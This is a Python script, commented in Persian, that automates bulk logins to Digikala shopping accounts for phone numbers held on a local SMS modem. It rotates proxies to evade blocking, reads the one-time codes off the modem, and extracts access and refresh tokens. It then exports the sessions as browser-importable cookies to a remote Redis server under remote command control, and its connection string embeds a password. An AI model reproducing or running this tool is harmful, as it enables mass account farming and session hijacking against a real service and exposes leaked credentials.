import time
import json
import re
import requests
import redis
import urllib3
import secrets
import hashlib
import base64
import urllib.parse
import sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
REDIS_URL = "redis://default:RvXoGwTEYMqXysRGVyPuMhLQBfxjzrBx@mainline.proxy.rlwy.net:52499"


def normalize_phone(phone_str):
    p = str(phone_str).strip()
    return "0" + p if p.startswith("9") and len(p) == 10 else p


def generate_pkce():
    verifier = secrets.token_urlsafe(64)
    hashed = hashlib.sha256(verifier.encode('ascii')).digest()
    challenge = base64.urlsafe_b64encode(hashed).decode('ascii').rstrip('=')
    return verifier, challenge


class ProxyManager:
    def __init__(self, proxies):
        self.proxies = [{"url": p, "uses": 0} for p in proxies]
        self.lock = threading.Lock()

    def get_proxy(self):
        with self.lock:
            available = [p for p in self.proxies if p["uses"] < 4]
            if available:
                chosen = min(available, key=lambda p: p["uses"])
                chosen["uses"] += 1
                return chosen["url"]
        return None

    def release_proxy(self, proxy_url):
        with self.lock:
            for p in self.proxies:
                if p["url"] == proxy_url and p["uses"] > 0:
                    p["uses"] -= 1
                    break


class NexusBridgeAgent:
    def __init__(self):
        print("======================================================")
        print(" 🚀 Nexus Extractor - DIGIKALA SECURE BULK MODE 🚀 ")
        print("======================================================")
        self.db = self.connect_redis()
        self.device_lock = threading.Lock()

    def connect_redis(self):
        while True:
            try:
                db = redis.Redis.from_url(REDIS_URL, decode_responses=True)
                db.ping()
                print("✅ Connected to Cloud Redis.")
                return db
            except Exception:
                time.sleep(5)

    def send_alert_to_admin(self, text):
        try:
            self.db.rpush("bot:admin_alerts", text)
        except Exception:
            pass

    def send_file_to_admin(self, filename, content):
        try:
            file_data = {"filename": filename, "content": content}
            self.db.rpush("bot:admin_files", json.dumps(file_data, ensure_ascii=False))
        except Exception:
            pass

    def get_active_proxies(self):
        try:
            proxies = []
            with open("p.txt", "r") as f:
                lines = f.read().splitlines()
                
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                
                # پشتیبانی خودکار از فرمت user:pass@ip:port
                if not line.startswith("http"):
                    proxy_url = f"http://{line}"
                else:
                    proxy_url = line
                    
                proxies.append(proxy_url)
                
            unique_proxies = list(set(proxies))
            print(f"🔍 تعداد {len(unique_proxies)} پروکسی از فایل p.txt دریافت شد.")
            return unique_proxies
            
        except FileNotFoundError:
            print("❌ فایل p.txt پیدا نشد! لطفا فایل را در کنار اسکریپت قرار دهید.")
            return []
        except Exception as e:
            print(f"❌ خطای خواندن فایل پروکسی: {e}")
            return []

    def get_all_phones_from_device(self):
        try:
            res = requests.get("http://127.0.0.1:11188/api.jsp?act=getPortList", timeout=5).json()
            if res.get("Code") == "1":
                return [normalize_phone(p.get("Phone")) for p in res.get("List", []) if p.get("Phone")]
        except Exception:
            pass
        return []

    def wait_for_sms(self, target_phone, timeout=50):
        start_time = time.time()
        while time.time() - start_time < timeout:
            sms_list = []
            try:
                with self.device_lock:
                    res = requests.get(
                        "http://127.0.0.1:11188/api.jsp?act=getSmsList&StartID=0",
                        timeout=5
                    ).json()
                if res.get("Code") == "1":
                    sms_list = res.get("List", [])
            except Exception:
                pass

            for sms in reversed(sms_list):
                if normalize_phone(sms.get("Phone", "")) == target_phone:
                    msg = sms.get("Message", "")
                    if "دیجی" in msg or "digi" in msg.lower():
                        match = re.search(r'\b\d{5,6}\b', msg)
                        if match:
                            return match.group()

            time.sleep(2)
        return None

    def process_single_phone(self, phone, proxy_manager):
        logs = [f"====== [ شروع عملیات برای: {phone} ] ======"]
        proxy_url = proxy_manager.get_proxy()

        if not proxy_url:
            logs.append("❌ خطا: ظرفیت پروکسی تکمیل شد.")
            return phone, "error", "ظرفیت پروکسی تکمیل شد", "\n".join(logs)

        # نمایش IP بدون رمز برای امنیت در لاگ
        safe_proxy_log = proxy_url.split('@')[-1] if '@' in proxy_url else proxy_url
        logs.append(f"🌐 Proxy in use: {safe_proxy_log}")

        session = requests.Session()
        session.proxies = {"http": proxy_url, "https": proxy_url}
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 '
                          '(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,'
                      'image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'fa,en-US;q=0.7,en;q=0.3',
        })

        verifier, challenge = generate_pkce()
        nonce = secrets.token_urlsafe(16)
        state = secrets.token_urlsafe(16)
        redirect_uri = "https://www.digikala.com/sso-redirect/?back-url=%2Fprofile%2F"

        auth_url = (
            "https://auth.digikala.com/realms/dk-group/protocol/openid-connect/auth"
            f"?client_id=digikala-web-public"
            f"&redirect_uri={urllib.parse.quote(redirect_uri)}"
            f"&response_mode=fragment&response_type=code&scope=openid"
            f"&nonce={nonce}&state={state}"
            f"&code_challenge={challenge}&code_challenge_method=S256"
        )

        try:
            res = session.get(auth_url, timeout=15)
            logs.append(f"▶️ GET Auth URL | Status: {res.status_code}")

            if res.status_code == 403:
                logs.append("❌ مسدود شدن پروکسی (403)")
                return phone, "error", "پروکسی مسدود (403)", "\n".join(logs)

            soup = BeautifulSoup(res.text, 'html.parser')
            form = soup.find('form')
            if not form:
                logs.append(f"❌ فرم ورود یافت نشد.\nSnippet: {res.text[:300]}")
                return phone, "error", "فرم ورود یافت نشد", "\n".join(logs)

            action_url = form.get('action')
            logs.append(f"▶️ POST Phone -> {action_url.split('?')[0]}")

            res = session.post(
                action_url,
                data={"username": phone, "rememberMe": "on"},
                timeout=15
            )
            logs.append(f"◀️ POST Phone Response | Status: {res.status_code}")
            soup = BeautifulSoup(res.text, 'html.parser')

            if soup.find('input', {'name': 'password'}) or soup.find('input', {'type': 'password'}):
                logs.append("⚠️ صفحه رمز عبور — سوئیچ به پیامک...")
                otp_exec_input = soup.find('input', {'id': 'otp-auth-execution'})
                if not (otp_exec_input and otp_exec_input.has_attr('value')):
                    logs.append("❌ otp-auth-execution یافت نشد.")
                    return phone, "error", "خطای ساختار فرم رمز", "\n".join(logs)

                exec_value = otp_exec_input['value']
                form_login = soup.find('form', {'id': 'dk-form-login'})
                form_action = form_login.get('action') if form_login else action_url
                logs.append(f"▶️ POST OTP Switch (exec={exec_value})")

                res = session.post(
                    form_action,
                    data={"authenticationExecution": exec_value},
                    timeout=15
                )
                logs.append(f"◀️ سوئیچ به پیامک | Status: {res.status_code}")
                soup = BeautifulSoup(res.text, 'html.parser')

            form_otp = soup.find('form')
            if not form_otp:
                logs.append(f"❌ فرم OTP یافت نشد.\nSnippet: {res.text[:300]}")
                return phone, "error", "فرم OTP یافت نشد", "\n".join(logs)

            otp_action_url = form_otp.get('action')

            logs.append("⏳ در حال انتظار برای دریافت پیامک تایید (Max: 50s)...")
            code = self.wait_for_sms(phone, timeout=50)
            if not code:
                logs.append("❌ تایم‌اوت: هیچ پیامکی دریافت نشد.")
                return phone, "error", "تایم‌اوت پیامک", "\n".join(logs)

            logs.append(f"💬 کد پیامک دریافت شد: {code}")

            payload = {"code": code}
            for hidden in form_otp.find_all('input', type='hidden'):
                if hidden.has_attr('name') and hidden.has_attr('value'):
                    payload[hidden['name']] = hidden['value']

            res = session.post(otp_action_url, data=payload, allow_redirects=False, timeout=15)
            logs.append(f"▶️ POST OTP Code | Status: {res.status_code}")

            if res.status_code == 200:
                page_text = BeautifulSoup(res.text, 'html.parser').get_text()
                if "وجود ندارد" in page_text or "ساخت حساب" in page_text:
                    logs.append("⚠️ شماره در دیجی‌کالا حساب ندارد (کاربر جدید). رد شد.")
                    return phone, "no_account", "بدون حساب دیجی‌کالا", "\n".join(logs)
                elif "نادرست" in page_text or "اشتباه" in page_text or "کد وارد" in page_text:
                    logs.append("❌ کد OTP اشتباه یا منقضی شده بود.")
                    return phone, "error", "OTP اشتباه", "\n".join(logs)
                else:
                    logs.append(f"❌ پاسخ 200 غیرمنتظره از OTP.\nSnippet: {res.text[:250]}")
                    return phone, "error", "OTP 200 unexpected", "\n".join(logs)

            if res.status_code != 302:
                logs.append(f"❌ Status غیرمنتظره از OTP: {res.status_code}")
                return phone, "error", f"OTP status={res.status_code}", "\n".join(logs)

            location = res.headers.get('Location', '')
            cmatch = re.search(r'[#&?]code=([^&\s#]+)', location)
            if not cmatch:
                logs.append(f"❌ auth_code در Location یافت نشد.\nLocation: {location}")
                return phone, "error", "auth_code missing", "\n".join(logs)

            auth_code = urllib.parse.unquote(cmatch.group(1))
            logs.append("▶️ استخراج توکن‌های امنیتی (Auth Exchange)...")

            token_data = {
                "code": auth_code,
                "grant_type": "authorization_code",
                "client_id": "digikala-web-public",
                "redirect_uri": redirect_uri,
                "code_verifier": verifier,
            }
            res_token = session.post(
                "https://auth.digikala.com/realms/dk-group/protocol/openid-connect/token",
                data=token_data,
                timeout=15
            )
            logs.append(f"◀️ POST Token Response | Status: {res_token.status_code}")

            if res_token.status_code != 200:
                logs.append(f"❌ خطا در ساخت توکن.\nResponse: {res_token.text}")
                return phone, "error", "خطا در دریافت توکن", "\n".join(logs)

            tokens = res_token.json()
            access_token = tokens.get('access_token')
            refresh_token = tokens.get('refresh_token')

            session.cookies.set(
                "Digikala:User:Token:v2", access_token,
                domain=".api.digikala.com", path="/", secure=True
            )
            if refresh_token:
                session.cookies.set(
                    "Digikala:User:Refresh:Token:v2", refresh_token,
                    domain=".api.digikala.com", path="/v1/user/", secure=True
                )

            extension_cookies = []
            for cookie in session.cookies:
                extension_cookies.append({
                    "domain": cookie.domain,
                    "hostOnly": not cookie.domain.startswith('.'),
                    "httpOnly": 'HttpOnly' in cookie._rest if cookie._rest else False,
                    "name": cookie.name,
                    "path": cookie.path,
                    "sameSite": "lax",
                    "secure": cookie.secure or True,
                    "session": cookie.expires is None,
                    "storeId": "0",
                    "value": cookie.value,
                    "expirationDate": int(time.time()) + (30 * 24 * 60 * 60),
                })

            final_json = {"cookies": extension_cookies, "origins": []}
            name = "کاربر دیجی‌کالا"
            self.db.rpush("bot:new_accounts", json.dumps(
                {"phone": phone, "name": name, "data": final_json},
                ensure_ascii=False
            ))
            self.db.sadd("jet:processed_phones", phone)

            logs.append("✅ عملیات لاگین و ذخیره‌سازی نشست با موفقیت به اتمام رسید.")
            return phone, "success", name, "\n".join(logs)

        except Exception as e:
            logs.append(f"❌ خطای پیش‌بینی نشده (Exception): {str(e)}")
            return phone, "error", str(e)[:50], "\n".join(logs)
        finally:
            proxy_manager.release_proxy(proxy_url)

    def run_bulk(self):
        proxies = self.get_active_proxies()
        all_phones = self.get_all_phones_from_device()

        if not proxies:
            self.send_alert_to_admin("❌ توقف سیستم: هیچ پروکسی فعالی یافت نشد.")
            return
        if not all_phones:
            self.send_alert_to_admin("❌ توقف سیستم: هیچ شماره‌ای یافت نشد.")
            return

        processed = self.db.smembers("jet:processed_phones")
        target_phones = [p for p in all_phones if p not in processed]

        if not target_phones:
            self.send_alert_to_admin("✅ عملیات لغو شد: تمام شماره‌ها قبلاً پردازش شده‌اند.")
            return

        capacity = len(proxies) * 4
        if len(target_phones) > capacity:
            self.send_alert_to_admin(
                f"⛔️ **توقف سیستم (کمبود پروکسی)**\n"
                f"شماره‌ها: {len(target_phones)}\nظرفیت پروکسی: {capacity}\n\n"
                f"لطفاً تعداد پروکسی را افزایش دهید."
            )
            return

        start_report = (
            f"🚀 **گزارش شروع عملیات دیجی‌کالا:**\n"
            f"تعداد پروکسی: {len(proxies)} (ظرفیت: {capacity}) | شماره‌ها: {len(target_phones)}\n"
            f"⏳ در حال پردازش..."
        )
        print(start_report)
        self.send_alert_to_admin(start_report)

        pm = ProxyManager(proxies)
        success_count, no_account_count, error_count = 0, 0, 0
        full_logs = []

        # تردهای بهینه برای جلوگیری از اختلال در ریکوئست‌های مودم
        max_workers = min(len(proxies), 15) 
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(self.process_single_phone, phone, pm) for phone in target_phones]
            for future in as_completed(futures):
                phone, status, msg, p_log = future.result()
                full_logs.append(p_log)
                if status == "success":
                    success_count += 1
                elif status == "no_account":
                    no_account_count += 1
                else:
                    error_count += 1

        end_report = (
            f"📊 **گزارش نهایی سیستم دیجی‌کالا:**\n"
            f"✅ موفق: {success_count}\n"
            f"⚠️ بدون حساب: {no_account_count}\n"
            f"❌ ارورها: {error_count}\n\n"
            f"عملیات با موفقیت به اتمام رسید."
        )
        print("\n" + end_report)
        self.send_alert_to_admin(end_report)

        if full_logs:
            file_content = "\n\n" + ("=" * 50) + "\n\n".join(full_logs)
            filename = f"Nexus_Debug_Log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            self.send_file_to_admin(filename, file_content)

    def run(self):
        print("🟢 Listening for ADMIN BULK RUN command for Digikala...")
        while True:
            try:
                task = self.db.blpop("bot:admin_commands", timeout=5)
                if task and task[1] == "START_BULK":
                    self.run_bulk()
            except Exception:
                time.sleep(2)


def check_license():
    url = "https://erlink.s3.ir-thr-at1.arvanstorage.ir/ls.txt?versionId="
    print("🔄 در حال بررسی دسترسی و لایسنس...")
    try:
        response = requests.get(url, timeout=10)
        if response.text.strip().lower() == "ok":
            print("✅ لایسنس تایید شد! برنامه آماده به کار است.\n")
            return True
        else:
            print("❌ دسترسی مسدود است! لایسنس نامعتبر یا منقضی شده است.")
            time.sleep(5)
            return False
    except Exception:
        print("❌ خطا در ارتباط با سرور لایسنس. لطفا اینترنت خود را بررسی کنید.")
        time.sleep(5)
        return False


if __name__ == "__main__":
    if check_license():
        NexusBridgeAgent().run()
    else:
        sys.exit()
